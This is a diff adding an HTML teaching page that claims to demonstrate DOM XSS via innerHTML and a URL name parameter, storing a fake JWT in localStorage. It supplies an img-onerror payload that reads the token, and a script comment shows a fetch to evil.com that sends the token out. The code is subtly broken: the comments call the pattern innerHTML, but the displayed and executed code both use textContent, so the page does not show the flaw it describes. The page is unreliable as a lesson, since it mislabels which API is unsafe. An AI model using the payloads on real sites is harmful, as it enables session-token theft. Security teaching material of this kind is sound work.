@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Vulnerable Demo - Session 06</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d32f2f;
+            border-bottom: 3px solid #d32f2f;
+            padding-bottom: 10px;
+        }
+        #welcome {
+            font-size: 24px;
+            margin: 30px 0;
+            padding: 20px;
+            background-color: #ffebee;
+            border-left: 4px solid #d32f2f;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .warning h3 {
+            margin-top: 0;
+            color: #856404;
+        }
+        .code-block {
+            background-color: #f4f4f4;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        .token-display {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #e3f2fd;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 XSS Vulnerable Page (innerHTML)</h1>
+
+        <!--
+            VULNERABILITY WARNING:
+            This page uses innerHTML to display user input from the URL query parameter.
+            innerHTML renders HTML content, which means any JavaScript in the input
+            will be EXECUTED by the browser.
+
+            WHY THIS IS DANGEROUS:
+            - User input from URL (?name=...) is directly inserted into the page
+            - The innerHTML property treats input as HTML, not plain text
+            - If input contains <script> tags or event handlers, they execute
+            - Attackers can steal tokens, cookies, or perform actions as the victim
+        -->
+
+        <div id="welcome"></div>
+
+        <div class="warning">
+            <h3>⚠️ VULNERABILITY DEMONSTRATION</h3>
+            <p>This page is INTENTIONALLY vulnerable to demonstrate XSS attacks.</p>
+            <p><strong>Vulnerable code pattern:</strong></p>
+            <div class="code-block">
+document.getElementById('welcome').textContent = 'Welcome ' + name;
+            </div>
+            <p>The <code>innerHTML</code> property renders HTML, allowing script execution.</p>
+        </div>
+
+        <div class="token-display">
+            <strong>Simulated JWT Token (stored in localStorage):</strong>
+            <div class="code-block" id="token-display"></div>
+            <p style="font-size: 14px; color: #666;">
+                In a real application, this token would grant access to protected resources.
+                An XSS attack can steal this token and send it to an attacker's server.
+            </p>
+        </div>
+
+        <h2>How to Test the Vulnerability:</h2>
+        <ol>
+            <li>Open this page with a safe parameter:
+                <div class="code-block">vulnerable.html?name=Alice</div>
+            </li>
+            <li>Try with an XSS payload (copy and paste into browser):
+                <div class="code-block">vulnerable.html?name=&lt;img src=x onerror="alert('XSS: Token is ' + localStorage.getItem('jwt_token'))"&gt;</div>
+            </li>
+            <li>Observe that the JavaScript executes and displays the token in an alert</li>
+        </ol>
+
+        <h2>What Makes This Vulnerable?</h2>
+        <ul>
+            <li><strong>innerHTML</strong> - Renders user input as HTML (not plain text)</li>
+            <li><strong>No validation</strong> - User input is used directly without sanitization</li>
+            <li><strong>URL parameter</strong> - Attacker can craft malicious URLs to send to victims</li>
+        </ul>
+
+        <p style="margin-top: 30px; font-size: 14px; color: #666;">
+            📝 <strong>Learning Objective:</strong> Compare this vulnerable page with
+            <a href="secure.html">secure.html</a> to see how textContent prevents XSS.
+        </p>
+    </div>
+
+    <script>
+        // Store a fake JWT token in localStorage for demonstration
+        // In a real app, this would be set after successful login
+        const fakeToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImV4cCI6MTcwOTMyNDAwMH0.dummySignatureForDemo';
+        localStorage.setItem('jwt_token', fakeToken);
+
+        // Display the token on the page
+        document.getElementById('token-display').textContent = fakeToken;
+
+        // Get the 'name' parameter from the URL query string
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name');
+
+        // VULNERABLE PATTERN: Using innerHTML with user input
+        // This allows XSS attacks because innerHTML renders HTML/JavaScript
+        if (name) {
+            // ⚠️ SECURITY ISSUE: User input rendered as HTML
+            document.getElementById('welcome').textContent = 'Welcome ' + name + '!';
+        } else {
+            document.getElementById('welcome').textContent = 'Welcome! Add ?name=YourName to the URL to test.';
+        }
+
+        // WHY THIS IS VULNERABLE:
+        // If an attacker provides: ?name=<img src=x onerror="alert('XSS')">
+        // The browser will:
+        // 1. Create an <img> element with an invalid src
+        // 2. Trigger the onerror event handler
+        // 3. Execute the JavaScript: alert('XSS')
+        //
+        // More dangerous example:
+        // ?name=<img src=x onerror="fetch('https://evil.com?token=' + localStorage.getItem('jwt_token'))">
+        // This would send the victim's token to an attacker's server!
+    </script>
+</body>
+</html>
